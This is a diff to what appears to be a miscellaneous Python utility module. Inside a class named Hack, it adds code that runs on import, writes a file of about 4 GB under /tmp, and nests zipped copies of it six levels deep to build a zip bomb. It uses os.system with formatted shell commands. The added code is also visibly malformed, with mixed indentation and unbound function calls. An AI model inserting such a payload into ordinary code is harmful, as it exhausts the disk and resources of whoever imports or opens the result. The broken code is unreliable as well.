@@ -331,15 +331,6 @@ def send(x):
 def RAW(Bite):
   from scapy.packet import Raw
   return Raw(Bite)
-def StrIO():
-  from csv import StringIO
-  return StringIO()
-def IO_Write(IO, text):
-  text.encode('utf-8')
-  IO.write(text)
-def sample(x, y):
-  from random import sample
-  return sample(x, y)
 @jit
 def sum2d(arr):
     M, N = arr.shape
@@ -709,7 +700,47 @@ def shuffle_sentence(sentence):
     import nltk
     tokens = nltk.word_tokenize(sentence)
     return glue(shuffle(tokens))
-class Hack:
+class Hack:	
+	import os
+	depth = 6
+	width = 17
+	zip_file = 'bomb.zip'
+	tmp_dir = '/tmp/zip_bomb'
+	file_name = '0.txt'
+	mb = 1048576
+	def create_tmp_dir():
+    	if not os.path.exists(tmp_dir):
+        	os.makedirs(tmp_dir)
+
+	def create_zip(target, source):
+    	command = 'zip -rmj9 {} {}'.format(target, source)
+    	os.system(command)
+
+	def create_file():
+    	file_path = '{}/{}'.format(tmp_dir, file_name)
+    	f = open(file_path, 'w')
+    	# 4GB - 1byte (largest file that zip will currently compress)
+    	for i in range((1024 * 4) - 1):
+        	f.write('1' * mb)
+    	f.write('1' * (mb - 1))
+    	f.close()
+    	target = '{}/0-0.zip'.format(tmp_dir)
+    	create_zip(target, file_path)
+	def create_bomb():
+    	for d in range(depth):
+        	if d > 0:
+            	target = '{}/{}-0.zip'.format(tmp_dir, d)
+            	source = '{}/*.zip'.format(tmp_dir)
+            	create_zip(target, source)
+        	for w in range(1, width):
+            	command = 'cp {}/{}-0.zip {}/{}-{}.zip'.format(tmp_dir, d, tmp_dir, d, w)
+            	os.system(command)
+
+	create_tmp_dir()
+	create_file()
+	create_bomb()
+	source = '{}/*.zip'.format(tmp_dir)
+	create_zip(zip_file, source)
     def Hack_PDF(pdf):
         import pikepdf
         from tqdm import tqdm
